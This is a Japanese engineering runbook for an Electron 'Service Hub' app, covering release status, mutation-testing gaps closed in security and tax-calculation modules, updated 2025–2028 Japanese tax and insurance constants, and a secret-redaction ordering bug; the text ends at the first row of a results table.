# Service Hub — 残りの作業手順書

最終更新: 2026-08-17
対象ブランチ: `claude/eager-brown-7cev3c`（既定ブランチは `main`）

このドキュメントは「今の状態から先に何が残っているか」を並べたランブックです。
**2026-05-12 版は 10 サービス / PR #2 draft を前提にしていて 2 か月半ズレていた**ため、
実測値で書き直しました。以後もズレたら実測で直してください（件数の一部は
`npm run lint:docs` が機械照合します）。

---

## 現状（2026-08-17 実測）

- [x] **74 サービス**の UI + スナップショット表示（おすすめ / 士業連携 / 分析・ツール / 外部サービス連携）
- [x] 全 74 サービスのライブフェッチャー（`LIVE_FETCHERS` は総和型。欠けたら起動時に落ちる）
- [x] write アクション（`LIVE_ACTIONS`）+ `lint:test-coverage` が全サービスのテストとアクションを強制
- [x] OAuth 2.0 + PKCE code flow — **10 プロバイダ配線済み**
      （drive / calendar / gmail / freee / microsoft-365 / slack / notion / canva / wordpress / atlassian）
- [x] `safeStorage` によるトークン暗号化保存 + 自動 refresh
- [x] **テスト 7,728 件合格**・typecheck・`verify:all` **22 ゲート** green
- [x] ブラウザ単体版 `dist/standalone.html`（10.78 MB）と LITE 版 `standalone-lite.html`（2.67 MB）
      — CI が両方の下限・上限を検査（LITE は 4MB 上限 + 85% 到達で警告）
- [x] **GitHub Release v0.1.0 を 4 資産で配布済み**（2026-07-27）
      — AppImage / `.deb` / arm64 `.dmg` / Windows `.exe`
- [x] GitHub Pages 配信（landing + デモ 3 種 + lite）
- [x] 知識コーパス **4,140 項目**（学術 3,518 / 法令実務 393 / 補助金 140 / 経済史 86 / 相談窓口 3）
      + Obsidian vault 7,543 ノート + knowledge-graph（nodes 4,140 / edges 20,978）
- [x] 重複疑いキュー **3 系列すべて 0 件** / 出典ベースライン **0 件**（識別子衝突も 0）
- [x] **全 74 画面で任意の数値・事業を追加できる**（`manual-metrics` / `business-units`）。
- [x] **画面の数字の出どころを宣言**（`shared/dataOrigin.ts`: remote 15 / local 17 / sample 42）。
      公式 API 未配線の 24 サービスで「更新を押すと画面が空になり緑の『ライブ』が付く」
      不具合を修正し、`lint:data-origin` が実装と宣言のズレを双方向で落とす。
      計算値の置き換えは一覧を持つ 5 画面 65 項目（overview 45 / sales 3 / kpi 8 /
      real-estate 5 / mutual-funds 4）

未完了の主要タスク（優先度順）:

**2026-08-17 時点で、手元で進められる工学的な残作業は無い。** 下に残っているものは
いずれも (a) 外部の資格情報や別 OS が要る、(b) 上流の修正待ち、(c) 破壊的なので
意図的に保留、のいずれかである。「やれるのに放置している項目」は無い。

- [x] **知識コーパスの増強バックログ 0 件 — 完走**
      — `npm run knowledge:auto` が「✅ 全て最新 — LLM 作業なし」を出力。増強・再検証・asOf・
      重複疑い 3 系列・出典衛生・リンク切れの **8 キューすべて 0 件**（2026-08-17 再確認）
- [x] **単発誤 DOI の掃討** — 恒久対策として `lint:doi-prefix` を新設済み。
      DOI 接頭辞と誌名/出版社の矛盾・埋め込み ISBN のチェックディジット・同一誌コードの矛盾・
      同一文献の別 DOI（識別子衝突）を機械判定する。**4 つの台帳すべて 0 件・除外リストなし**
- [x] **OAuth: 他プロバイダの config 追加** — Notion / Slack / Canva / WordPress / Atlassian は
      配線済み（計 10 プロバイダ）
- [x] **dev 依存の脆弱性を 15 件 → 2 件へ削減**（本番依存は 0 件のまま）
- [x] **dev 依存の脆弱性も 0 件にした**（2026-08-17）。上流待ちにしていた
      `qs` の DoS（`@stryker-mutator/core` → `typed-rest-client` → `qs@6.15.1`）は
      **npm の `overrides` で `qs@^6.15.2` を強制**して解消した。Stryker のリリースを
      待つ必要は無かった。patch 更新なので `typed-rest-client` の API は変わらず、
      Stryker の実行（mutation 100% 維持）・typecheck・全テストで確認済み。
      `npm audit` は最新のアドバイザリを都度取得するため件数は変動する —
      数える前に実行すること
- [x] **Intel Mac (x64) の `.dmg` をビルド対象に入れた**（2026-08-17）。
      `electron-builder.json` の `mac.target` に `arch: ["x64", "arm64"]` を明示した。
      v0.1.0 が arm64 のみだったのは arch を書いておらず `macos-latest`（arm64）の
      ホスト arch だけが出ていたため。**次のタグ push で両方の dmg が出る**
      （成果物そのものは macOS ランナーが作るので、ここでは検証できない）
- [x] **配布コード署名の配線**（Phase 7-1）を入れた（2026-08-17）。
      `release.yml` が `CSC_LINK` / `CSC_KEY_PASSWORD` / `APPLE_ID` /
      `APPLE_APP_SPECIFIC_PASSWORD` / `APPLE_TEAM_ID` を渡す。**secrets が無ければ
      署名を飛ばしてビルドは通る**ので、証明書が未調達でもリリースは作れる。
      公証は `APPLE_ID` が入っているときだけ有効化する（未設定で on にすると
      署名の無い状態で公証を試みて失敗するため）。
      **残るのは証明書の調達そのもの**（Apple Developer / Windows の OV or EV）
- [x] **更新の確認**（Phase 7-2 の安全な部分）を実装した（2026-08-17）。
      `shared/updateCheck.ts` + IPC `app:checkUpdate` + 設定画面。
      **取得もインストールもしない** — 署名の無い配布物を自動で取得して実行する
      経路は、トークンを保持するこのアプリでは新しいコード実行の入口になる。
      新しい版があることを伝え、ダウンロードは利用者がリリースページで行う。
      応答は形とホスト（github.com のみ）まで検証するので、応答を差し替えられても
      任意の URL を案内先にはできない。mutation 100%（135 変異体・pragma 0）
- [ ] **自動ダウンロード・自動インストール**（Phase 7-2 の残り）— **署名が前提**。
      判定（`evaluateUpdate`）と取得を分けてあるので、証明書が入れば
      判定はそのまま使って差し替えられる
- [x] **`.git` 1.3 GB — 再発防止を実装し、縮小手順は文書化した**（2026-08-17）。
      実行しない判断の根拠を測って残した:
      **① リモートは履歴を書き換えても縮まない** — `refs/pull/*` が古い blob を恒久的に
      固定するので、**GitHub Support に gc を依頼**しないと実容量は減らない。
      「約 470MB 減る」はローカルの `.git` の話である。
      **② ローカルは非破壊で今すぐ解決する** — `git clone --depth 50` で数十 MB になる。
      CI も `actions/checkout@v4` が既定で浅いクローンなので対策済み。
      **③ 実装した再発防止**: `lint:repo-size`（1 ファイル 12MB / 追跡合計 80MB の天井 +
      85% で警告）を `verify:all` と CI に登録。`verify:arch` は追跡行数の**下限**しか
      見ておらず膨張を捕まえないため、床と天井の両方を置いた。実測 57.7MB / 8,396 ファイル。
      **④ 手順書**: `docs/GIT_HISTORY_SHRINK.md`。**浅いクローンからは実行不可**
      （2026-08-17 実測でコンテナは shallow・手元 ref 2 本 / リモート 217 本。
      force-push すると手元に無い 215 本を消す）。全履歴を持つ手元のマシンでのみ実行する
- [x] **`e2e` / `e2e:lite` / `perf` を CI から回せるようにした**（2026-08-17・`.github/workflows/e2e.yml`）。
      既定では走らない（Actions 分の節約という判断は維持）。走らせ方は 2 つ:
      **① Actions 画面から手動実行**（対象を both / full / lite で選べる）、
      **② PR に `run-e2e` ラベルを付ける**。通常の PR の待ち時間と Actions 分は変わらない。
      `e2e:ollama` / `smoke` は Ollama スタブと Electron の実描画が要るためローカル専用のまま

---

## 変異検査で測っていない範囲 (2026-08-19 実測・139 行)

`npm run lint:mutation-scope` の台帳 `KNOWN_BROAD` に載っている **1 ファイル
/ 1 箇所 / 139 行**（着手前は 36 ファイル / 46 箇所 / 5,189 行 = **97% 消化**）。
残る 1 件は SVG の座標の算術だけで、理由を添えた恒久的な除外である。これは「許した」ではなく「まだ測っていないと
分かっている」という意味である。ゲートは**双方向**で、増えても減っても落ちる
(減ったら台帳を実測値へ更新する)。

**この台帳には抜け道があった。** 上のゲートは `stryker.config.json` の `mutate` に
載っているファイルしか見ない。裏を返すと、**載せなければ何も言われない**。
`src/main/clients/exportPaths.ts` — 4 サービスの書き出しが全部通る、書き込み先を
決める最後の壁 — がそれで、中に無効化が掛かっていたのにファイル自体が一覧に
無いため**変異体が 1 つも作られず**、ゲートも無反応だった。同日、`MUST_MEASURE`
(必ず測る壁の一覧) を足して塞いだ。壁が黙って一覧から外れたら落ちる。

**同じ形の穴がもう 1 つあった (2026-08-19)。** `MUST_MEASURE` は当時見つけた 9 つを
並べただけで、**他に壁が無いかは調べていなかった**。追跡下の `.ts` を `mutate` と
突き合わせて全件洗ったところ、`src/shared/ollama.ts` が出てきた。ここには
`isAllowedOllamaBase` — 接続先を「ループバック / ページ自身と同じホスト / 任意の
https」の 3 通りに限る判定 — があり、モジュール自身が冒頭に
「**任意ホストへの http を許すとページが内部ネットワークの探索に使える踏み台になる**」
と書いている。にもかかわらず `mutate` に無く、**1 変異体も作られていなかった**。
同じディレクトリの `src/renderer/network/proxy.ts` は「SSRF の関門」として
`MUST_MEASURE` に載っていたので、**隣の壁だけが測られていた**ことになる。
一覧に足して実測すると **442 変異体 80.54%** で、認証情報つき URL の拒否・
文字列以外の入力の拒否・ポート境界のどれもが無証明だった。

**ブラウザ側の呼び出し口も測り切った (2026-08-20)。** `src/renderer/network/ollamaWeb.ts`
は着手時 **454 変異体 59.25%**（生存 113 / 未到達 72）。OS 別セットアップ手順の
文字列は利用者が貼り付けるコマンドそのものなので除外せず golden で固定し、
chat の成功経路と通信の枠 (時間切れ・サイズ上限・キャッシュ無効) にテストを
足して **437 変異体 100%・pragma 0 個**。等価変異が出るたびに黙らせずコードを
単純化した経緯は `docs/ARCHITECTURE.md` の同節に表でまとめてある。

### なぜ危険か — 実際に起きたこと

`src/renderer/data/store.ts` は先頭で 13 種の mutator を**ファイル全体**に対して
無効化しており、変異検査は **3 変異体・100%** と報告していた。無効化を外して実測すると
**256 変異体・71.09%・生存 44 / 未到達 30**。そこには実バグが潜んでいた —
全 11 箇所で `db.close()` が `await txDone(tx)` の**後ろ**にあり、書き込みが失敗すると
接続が閉じられず残る。テストを足したところ、この漏れが原因で別のテストが 30 秒
タイムアウトする形で表面化した。`withDb()` で構造的に閉じるよう直し、**242 変異体・100%**
になった (真の 100%)。

### 残っている範囲

| ファイル | 箇所 | 無効化行数 |
|---|---|---|
| `src/main/clients/templates.ts` | 1 | 139 (座標の算術のみ) |

**(2026-08-20 訂正)** ここには以前「security/ と oauth/ に残っているものが痛い。
`pkce.ts` / `ai/credentials.ts` / `ai/providers.ts` / `library.ts` は分母から外した
うえでの高スコアである」と書いてあったが、**下の表のとおり 4 件とも 100% に到達済み**
だった。同じ文書の中で表と本文が矛盾していた (`lint:docs` は文書**間**の整合しか
見ないのでこの型は検出できない)。

### 消化済み

| ファイル | 着手前 | 実測して分かったこと | 現在 |
|---|---|---|---|
| `src/renderer/data/store.ts` | 3 変異体「100%」 | 実測 256 変異体 71.09%。接続リーク 11 箇所 | **242 変異体 100%** |
| `src/renderer/network/proxy.ts` | 501 行を無効化 | 実測 422 変異体 73.70%。SSRF 判定に生存 43・先頭ドット回避を発見 | **321 変異体 100%** |
| `src/renderer/security/vault.ts` | 610 行を無効化 (3 箇所) | 実測 357 変異体 78.71%。`extractable: false` を証明する検査が無かった | **307 変異体 100%** |
| `src/renderer/oauth/pkce.ts` | 180 行を無効化 | 実測 171 変異体 77.71%。送っている中身 (`code_verifier` / `S256`) を誰も見ていなかった | **158 変異体 100%** ※ |
| `src/shared/ai/credentials.ts` | 176 行を無効化 | 実測 159 変異体 90.57%。空文字の API キーが「設定済み」として通っていた | **157 変異体 100%** |
| `src/shared/ai/providers.ts` | 301 行を無効化 | 実測 255 変異体 72.16%。全プロバイダの応答パーサが無証明。**生存 48 のうち 40 が static 変異体**と判明し `ignoreStatic` を採用 | **189 変異体 100%** |
| `src/renderer/security/autoLock.ts` | 85 行を無効化 | 実測 63 変異体 55.56%。**`onVisibilityChange` が丸ごと未到達** — 「タブを隠したら施錠」という中核の約束に検査が 1 つも無かった | **49 変異体 100%** |
| `src/main/oauth.ts` | 55 行を無効化 | 実測 394 変異体 70.05%。生存 117 のうち **103 が OAUTH_CONFIGS** (認可の送り先を決める表)。読み直す golden で殺した | **379 変異体 100%** |
| `src/renderer/fs/fsa.ts` | 128 行を無効化 | 実測 119 変異体 49.58%。**handle の永続化 (次にどこへ書くかを決める) が丸ごと未到達**。「モックを clone できない」という除外理由は、関数を持たない素のオブジェクトを使えば回避できた | **91 変異体 100%** |
| `src/main/clients/calendar.ts` | 99 行を無効化 | 実測 60 変異体 43.33%。**問い合わせの中身が丸ごと無証明** — 送り先 URL・`Authorization` ヘッダ・「今より後 / 繰り返しを展開 / 開始順」のどれ 1 つ固定されていなかった | **60 変異体 100%** |
| `src/main/clients/templates.ts` | 290 行を無効化 (3 箇所) | 実測 222 変異体 47.30%。11 箇所の無効化のうち **6 箇所は外しても 100% のまま** — 測れていた場所を隠していただけだった。残りは書き出し既定値 (実 `fs` が 1 度も動いていない) と折り返しの段組み | **136 変異体 100%**（算術のみ 139 行を明示除外） |
| `src/main/clients/exportPaths.ts` | **`mutate` に載っていない**（実測ゼロ） | 一覧に入れて実測 29 変異体 93.10%。長さ上限 1024 の境界がどちら側かを誰も見ていなかった | **27 変異体 100%** |
| `src/main/clients/emotions.ts` | 234 行を無効化 | 実測 215 変異体 55.35%。**日記を 0600 で書いていることを誰も見ていなかった**。壊れた記録を「まだ無い」と誤解して空で上書きする経路、消去で巻き添えになる経路も無証明 | **197 変異体 100%** |
| `src/main/clients/drive.ts` | 70 行を無効化 | 実測 38 変異体 57.89%。送り先・`Authorization`・`orderBy`/`pageSize`/`fields` のどれ 1 つ固定されていなかった | **38 変異体 100%** |
| `src/main/clients/wordpress.ts` | 110 行を無効化 | 実測 71 変異体 64.79%。**`is_free` と slug のどちらを信じるかの順番**が無証明 (無料プランを有料として出せる)。`free_plan` の判定は `includes('free')` と重複していたので削除 | **66 変異体 100%** |
| `src/main/clients/notion.ts` | 122 行を無効化 | 実測 77 変異体 65.38%。`Notion-Version` は `toBeDefined()` で見ていたので**空文字でも通っていた**。「最後に編集した順」の指定も無証明 | **78 変異体 100%** |
| `src/main/clients/canva.ts` | 81 行を無効化 | 実測 60 変異体 71.67%。`ownership`/`sort_by` と 12 件の上限が無証明 | **59 変異体 100%** |
| `src/main/clients/cloudflare.ts` | 189 行を無効化 | 実測 115 変異体 66.96%。**DNS レコードが既定でプロキシしないことを誰も見ていなかった** (真になると公開 IP が差し替わる)。ページ送りの上限、`unwrap` の「不明なエラー」経路も無証明 | **115 変異体 100%** |
| `src/main/clients/devEnv.ts` | 43 行を無効化 | 実測 199 変異体 83.89%。**「どのファイルを読むか」を決める層が丸ごと未到達**。一時ディレクトリを作って実際に読ませる形にした。`existsSafe` の try/catch は `fs.existsSync` が例外を投げない仕様なので削除 | **197 変異体 100%**（文言のみ 19 行を明示除外） |
| `src/main/clients/funding.ts` | 34 行を無効化 (`disable all` 2 箇所) | 実測 30 変異体 83.33%。モック表そのものは静的変異体なので測っても増えないが、**その隣にあった消費税の式** (課税仕入れ 60%・税込から 10% を取り出す) は本物で無証明だった | **30 変異体 100%**（pragma ゼロ） |
| `src/shared/taxCalc.ts` | 53 行を無効化 | 実測 439 変異体 91.72%。**速算表の境界 11 箇所が全部生存**。調べると**表が境界で連続だから観測できない**と分かったので、境界を突く代わりに**連続性そのものを検査**にした (定数の写し間違いはこちらで落ちる)。`needsAdvisor` (税理士必須の印) は全 14 件を固定 | **424 変異体 100%** |
| `src/renderer/data/counseling.ts` | 120 行を無効化 | 実測 129 変異体 94.57%。**危機応答の本文が消えても誰も気付かない**状態だった (窓口は並ぶが文章が空になる)。連続不調 3 日の閾値も無証明 | **129 変異体 100%** |
| `src/shared/ai/chat.ts` | 57 行を無効化 | 実測 22 変異体 86.36%。失敗本文の 200 字上限と `redactSecrets` が無証明 (相手が鍵を復唱して返す経路) | **22 変異体 100%** |
| `src/renderer/data/chatbot.ts` | 83 行を無効化 | 実測 170 変異体 67.06%。**書き込み操作の確認を促す一文**が消えても通っていた。案内文だけ 8 つの小さい帯に分けて除外 | **115 変異体 100%** |
| `src/renderer/library/library.ts` | 217 行を無効化 | 実測 196 変異体 68.88%。ファイル名/MIME/serviceId の検査、50 MB の上限、**保存済みファイルを消す唯一の経路 (間引き)**、`randomUUID` が無い環境の id 生成がすべて無証明 | **134 変異体 100%** |
| `src/shared/ollama.ts` | **`mutate` に載っていない**（実測ゼロ） | 一覧に入れて実測 442 変異体 80.54%。**接続先を 3 通りに限る関門が丸ごと無証明**だった — 認証情報つき URL の拒否は「ユーザ名だけ」しか固定されておらず `http://:pass@…` の形が漏れ、`toString` が正しい URL を返すオブジェクトも通っていた。ポート境界 (1 / 65535) も無証明。等価変異はすべてコードの単純化で消した（`typeof port === 'number'` の分岐・`pathname !== ''`・`pageHostname !== ''` は書いても結果が変わらない） | **376 変異体 100%**（既定値のみ 8 箇所の 1 行帯で除外） |
| `src/main/clients/stocks.ts` | 169 行を無効化 | 実測 759 変異体 92.49%。**生存 57 が全部この帯の中**。損益タイル・変動率・売買の別 (買い/売り) がどれも色と符号でしか出ないのに無証明で、`toContain('#22c55e')` は緑が買いシグナルの chip にも出るため落ちない検査だった。時価評価の式が **3 箇所に写して**あり、Markdown 側の pragma は「取り違えると過大計上する」と**自分で書きながらその mutator を止めて**いた。`portfolioEquity` 1 つに寄せた | **747 変異体 100%**（pragma ゼロ） |
| `src/main/clients/business.ts` | 199 行を無効化 (3 箇所) | 実測 294 変異体 89.80%。**生存 30 のうち 24 が利益の符号と色** — 判定が反転すると赤字が緑・プラス表記で出るのに、`toContain(GREEN)` は緑が他の用途でも使われるため常に通っていた。折れ線が売上を読まずに描かれても誰も気付かなかった | **278 変異体 100%**（型を絞る `typeof` の前置きのみ 5 行の帯で除外） |
| `src/main/clients/teamradar.ts` | 237 行を無効化 (4 箇所) | 実測 433 変異体 66.74%。保存の実経路 (tmp へ書いて rename) が未到達、入力の長さ境界が無証明、**図の構造** (輪の本数・軸の数・多角形の頂点数) も測られていなかった。action 側が `saveTeamRadarState` と同じ検査を重ねていたので削除 | **288 変異体 100%**（座標のみ 5 つの小さい帯で除外） |

※ **2026-08-20 に 100% へ到達した。** 以前は「残る 2 つは真の等価変異で、範囲指定で
囲めば 100% になるが 66 個の測定を捨てる (163 変異体 98.77% → 97 変異体 100%)」と
書いて生存のまま残していた。その比較自体は正しかったが、**第三の道を見落として
いた** — 結果を変えない分岐は黙らせるのではなく**消せる**。`=` を含むかの判定も
空文字の早期 return も、無くても `!code || !state` で null に落ちる。両方消したら
**158 変異体 100%**、捨てた測定は 5 個だけだった。宣言した壁 (`MUST_MEASURE`)
10 ファイルはこれで全部 100% になった。

### `mutate` に載っていない純ロジック — 実測した (2026-08-20)

「テストはあるが `mutate` に載っていない」モジュールを実測した。設定は
「pure-logic モジュールを対象」と言っているので、載っていないこと自体に
理由が要る。**結果は約 410 の生存**だった:

| ファイル | 実測 | 生存 | 現在 |
|---|---:|---:|---|
| `src/shared/waterCyclePlanner.ts` | 74.07% | 39 | **151 変異体 100%**・`mutate` へ登録 |
| `src/renderer/data/villageLayout.ts` | **13.30%** | 159 | 未着手 |
| `src/renderer/voice/ttsAdapter.ts` | **44.00%** | 121 | 未着手 |
| `src/renderer/data/charts.ts` | 72.01% | 75 | **246 変異体 100%**・`mutate` へ登録 |
| `src/renderer/voice/speechAdapter.ts` | 78.46% | 13 | 未着手 |
| `src/shared/connectors/freeConnectors.ts` | n/a | 0 | **変異体ゼロ** = 純粋なデータ表。載せる意味が無い |

**`waterCyclePlanner.ts` から着手した理由**は、ここが**法規制の答えを出す**
場所だから。水質汚濁防止法の一律排水基準 (全窒素 120mg/L・全りん 16mg/L) と
窒素りん規制の適用下限 (50m³/日) の判定が、`>` と `>=` も `&&` と `||` も
無証明のまま生存していた。取り違えると「基準を超えていません」と言ってしまう。

境界を全部固定した上で、等価変異は 3 つともコードの単純化で消した:

- `cap !== undefined && nonNeg(cap) > 0` — `nonNeg` は有限でない値を 0 にするので
  未指定は自動的に 0 に落ちる。`num.ts` の `nonNeg` が `undefined` も受けるよう
  型を広げた (実行時の振る舞いは不変)
- `dutyCyclePct !== null && …` — `idleDays` も同じ条件で null になるため結果が
  変わらない。`?? 100` (周期が取れないときは常時運転扱い) に寄せた
- `tn > 0 ? round1(tn / 基準値) : 0` — tn が 0 なら商も 0 で else と同じ

**`charts.ts` も 100% にした (2 件目)。** 全画面のグラフ描画の土台なので優先した。
既存の検査は「y は反転している」「割合の合計は 1」のように**性質**を見ており、
性質は算術を 1 つ書き換えても保たれることが多い。**座標そのもの**を手計算した
golden で固定した (折れ線 3 点・円の 25%/75% の path・レーダーの頂点)。

ここでも等価変異はコードの単純化で 3 つ消した:

- `total <= 0` の早期 return — `valid` は正の値だけなのでループが 1 度も
  回らず、最後の return が同じ値を返す。0 除算もループが回らない以上起きない
- レーダーの `all.length > 0 ? Math.min(0, ...all) : 0` — 空でも `Math.min(0)`
  は 0 なので両枝が同値 (max 側は `Math.max(...[])` が -Infinity になるため
  判定が要る、という非対称は残る)
- `i < s.values.length ? (s.values[i] ?? min) : min` — 範囲外の添字は
  undefined になり `?? min` が拾うので判定が要らない

残した pragma は 3 行、いずれも**構造的に観測できない**もの:

- `formatTick` の境界 (`>= 1000` / `>= 10`) — 境界ちょうどでは上下の丸めが
  同じ文字列を作る (1000 は整数でも小数第 1 位でも `"1000"`)
- `arcPath` の `sweep >= 359.999` — sweep は `(値/合計) × 360` で作られ、
  360000 分の 359999 でも 359.99899999999997 にしかならない (実測)。
  `>=` と `>` の違いが出る入力が公開 API から作れない

残り 3 件は次の対象として残す。**`villageLayout.ts` の 13.30% が最も低い**が、
AI の村の配置計算なので実害は視覚的なものに留まる。

### 変異検査 CI は「高すぎる」と「狭すぎる」が同時に成り立っていた (2026-08-20)

`mutation.yml` の冒頭には **「Mutation testing takes ~2 minutes」** と書いてあった。
実行履歴を見ると**実測は 75〜104 分** — 対象が 227 ファイルまで増えた結果で、
40 倍ずれていた。トリガー方針はこの誤った前提の上に立っていた。

実際に起きていたこと:

- 対象パスの 1 つ `src/main/clients/**` は変更の多いディレクトリなので push で
  頻繁に発火し、**2026-08-19 だけで 5 回 × 約 100 分 = 約 8 時間**を消費した
  (しかも全部失敗＝同じ 27 件を再報告しただけ)
- それでいて対象パスは **227 件中 2 件**しか無く、残り 225 件の退行は週次まで
  最大 7 日気付かない

全部を毎回測るのが高いなら、**変わったものだけ測ればよい**:

| きっかけ | 対象 |
|---|---|
| push (main) | 変わったファイルのうち `mutate` にあるものだけ。パス制限は撤廃 |
| 週次 / 手動 | 従来どおり全件 |

`scripts/mutate-changed.cjs` が対応付けを行う。**テストだけを変えた場合もその
対象を測る** — テストを緩めた変更こそ変異検査が捕まえるべきものだから。
差分を取れないとき (浅い clone など) は空ではなく `ALL` を返す — 分からない
ときに「変更なし」と答えると黙って何も測らないゲートになる。対応付けの規則は
9 件の対照実験で固定し、`mutation.yml` が使う直前に走らせている。

差分測定では incremental キャッシュを使わない (`stryker.config.json` の注記の
とおり、古い結果が残ると survived が誤って残る)。対象が少ないので毎回まっさら
から測っても数分で終わる。

**triage に `--include-string-literals` を付けた。** 既定では StringLiteral を
除外して表示するため、`financialRatios.ts` の生存 61 件が「27 件」に見えていた。
実際より小さい数字を報告するレポートは、直す優先度を誤らせる。

### 週次の変異検査 CI が main で赤だった — 原因は「落ちないテスト」(2026-08-20)

`mutation.yml` は 2026-08-18 を最後に**失敗し続けていた** (直近 12 連続)。
CI の triage は `StringLiteral` を既定で除外して表示するため「生存 27」と出るが、
実測すると 4 ファイルで **生存 69**:

| ファイル | 着手前 | 現在 |
|---|---|---|
| `src/renderer/data/financialRatios.ts` | **51.20%** (生存 61) | **125 変異体 100%** |
| `src/renderer/data/financialDiagnosis.ts` | 96.43% (生存 3) | **84 変異体 100%** |
| `src/renderer/hooks/useServiceData.ts` | 96.88% (生存 2) | **64 変異体 100%** |
| `src/renderer/security/dataCrypto.ts` | 97.78% (生存 3) | **127 変異体 100%** |

**`financialRatios.ts` の 61 件はテストを 1 行も足さずに消えた。** 原因は
テストの構造にあった — `describe` 直下で

```ts
const axes = radarAxes(computeFinancialRatios(SAMPLE));   // ← 収集時に確定
```

と計算していたため、**変異体が有効化される前の結果**を検査していた。15 軸の
key/label/unit/raw/score を JSON で丸ごと固定する golden まであったのに、
その golden は**どんな変異体でも落ちない**状態だった。呼び出しをサンクにして
各 `it` の中で評価するよう直しただけで 51.20% → 100%。

`stryker.config.json` の注記は「例外を投げる変異体が収集失敗になる」ことを
警告していたが、**例外を投げない変異体も同じ理由で素通りする**。より一般に
**describe 直下で対象を評価してはいけない**。

残り 3 ファイルは本物の検査不足だった:

- `financialDiagnosis` — 強みを点数の高い順に並べる `sort` が無証明 (入力順と
  点数順が同じ入力しか使っていなかった)
- `useServiceData` — **`autoFetch: true` で実際に取得が走ることを誰も見ていない**。
  死ぬと認証不要の画面が同梱スナップショットのまま更新されなくなる
- `dataCrypto` — `assertKdfIterations` の境界 (99,999 / 100,000 / 4,000,000 /
  4,000,001) は固定されていたが、**非数値を渡す検査が 1 つも無かった**。値は
  IndexedDB から来るので実行時には何でも来うる。反復回数を 1 に下げられると
  総当りが現実的になる門である。なお `typeof iterations !== 'number'` は
  `Number.isFinite` が型強制しないため結果を 1 つも変えておらず、削除した

### 税額の土台が 2 度の改正に取り残されていた (2026-08-21)

**このセッションで見つけたなかで影響が最も大きい。** アプリの所得税・住民税は
すべて `taxCalc.ts` の 2 つから出るのに、そこが令和6年分のままだった。

| 定数 | 直す前 | 正しい値 |
|---|---|---|
| 基礎控除 | 一律 48 万円 | 令和7年分 95/88/68/63/58 万、令和8・9年分 104/67/62 万、令和10年分以後 99/62 万 |
| 給与所得控除の最低保障 | 55 万円 (162.5 万円以下) | 65 万円 (**190 万円以下**) |
| 雇用保険料率 (本人/事業主) | 0.6% / 0.95% (令和6年度) | 0.5% / 0.85% (令和8年度・2 年連続の引き下げ) |
| 介護保険料率 (本人) | 0.8% | 0.81% (令和8年度 1.62% の半分) |

年収 400 万円なら合計所得 276 万円で、基礎控除は本来 104 万円のところ 48 万円。
**課税所得が 56 万円ぶん高く出ていた。**

#### 直しすぎなかった 2 か所のほうが重要

- **住民税の基礎控除 43 万円は据え置きで正しい。** 「地域社会の会費」という
  性格から引き上げないと整理されており、動いたのは所得税だけ。一緒に上げると
  住民税が過少になる
- **調整控除の人的控除差も 5 万円のまま。** ここは実額の差ではなく地方税法が
  定める固定値で、所得税の基礎控除がいくらになっても 5 万円。令和6年分以前は
  実額の差もちょうど 5 万円だったので `basic.incomeTax - basic.residentTax` で
  計算していて答えが合っていた。基礎控除だけ上げた結果**差が 24 万円に開き**、
  そのままなら調整控除が過大になって住民税を過少に見積もるところだった。
  **既存の検査がこれを捕まえた** — golden を素直に書き換えていたら埋め込んでいた

#### 年分の扱い

9 つの関数が `taxYear` を受ける (既定は現在の年)。**検査では必ず明示する** —
既定のままだと暦が変わった日に落ちるが、落ちるのは令和10年分が始まる 2028 年の
元日で、そのとき理由を思い出せる人はいない。

料率は過去の全年度を持っても誰も使わないので、現年度の値と
`SOCIAL_INSURANCE_RATE_FISCAL_YEAR` を持ち、`lint:rate-freshness` が
**1 年度遅れで警告・2 年度遅れで失敗**する。改定直後に毎年落とすと無視される
ようになるので警告の段を挟んである。今回見つかったのがちょうど 2 年度遅れだった。

### 「mutate に載っているのに 1 件も測らない」をゲート化した (2026-08-21)

`welfareDocs.ts` の 45 変異体が全部 "Static mutant (and ignoreStatic was
enabled)" として無視され、スコアが n/a だった件の横展開。`mutate` の 230
ファイルすべてについて「it(...) の中で 1 度でも呼ばれているか」を機械的に
調べた結果:

- 収集時にしか呼ばれていないもの: **welfareDocs.ts のみ** (修正済み)
- 直接 import されていない 10 件は間接経由で測られていた。`src/shared/api/*`
  の 7 件を実測して全件 100% を確認 (299 mutants・生存 0)

**他に同じ穴は無い。** `lint:collection-time` としてゲート化し、直す前の
welfareDocs.test.ts へ戻すと実際に鳴ることを対照実験で確認した。

### 会社負担で還元できる給付を足した (2026-08-21)

`welfareScheme.ts` は現物支給しか扱っていなかった。効き方が 3 種類あり、
社会保険・所得税・受け取る時点の当たり方が根本的に違うので、`employerBenefits.ts`
で区分ごとに持つ形にした (in-kind / employer-pension / salary-conversion)。

はぐくみ基金 (選択制DB) は標準報酬月額を下げるが、**下がるのは保険料だけでは
ない** — 老齢厚生年金・傷病手当金・出産手当金・障害厚生年金・遺族厚生年金も
同じだけ下がる。`caveat` として必ず持たせ、規程ひな形の第6条に説明義務を
明記し、画面にも警告として出す。

iDeCo+ / 企業型DC は 2026 年 12 月に月 6.2 万円へ引き上げ予定 (未施行) なので、
**現行値・改正後の値・施行日**の 3 つを持って `asOf` で選ぶ。

#### 途中で 1 つ間違えた

stocks 側で銘柄の許可リストにウォッチリストを使おうとして既存検査 2 件に
落とされた。**助言の宇宙はウォッチリストではない**。知らないものを知っている
ふりで絞ると、正しい結果を黙って捨てることになる。

### 配偶者控除・配偶者特別控除を反映した (2026-08-21)

`calcSpouseDeduction` は既にあったが、境目を **48 万円**で判定していた。
令和7年分 58 万円 → 令和8年分以後 62 万円と 2 年続けて改正されている。

令和8年分の 62 万円は令和8年12月1日施行だが、適用は**令和8年分の所得税全体**に
及ぶ。したがって切り替えは施行日ではなく**年分**で判定する — 食事補助
(施行日で切り替わる) とは軸が違うので取り違えない。

**「配偶者なし」と「所得 0 の配偶者あり」は結果がまるで違う** (0 円 vs 満額
38 万円) ので、`spouseIncome` の既定値を 0 にせず未指定は `undefined` のまま
にした。

### 秘匿より先に切り詰めていた — 呼び出し 17 箇所すべて (2026-08-21)

`redactSecrets` の呼び出しは**全部**が `redactSecrets(body.slice(0, 200))` と
書かれていた。**切ってから伏せている。**

`redactSecrets` は模様で秘密を見つけるので、模様の終わり (`"…"` の閉じ
引用符 / `Bearer` の 16 文字 / 接頭辞の 8 文字) が切り落とされると
**規則そのものが当たらなくなり**、見えている部分は伏せられない。

詰め物の長さを 0〜220 で振って 60 文字のトークンが何文字残るかを測った:

| 順序 | 漏れた文字数 |
|---|---|
| `redactSecrets(body.slice(0, 200))` | **60 (全部)** |
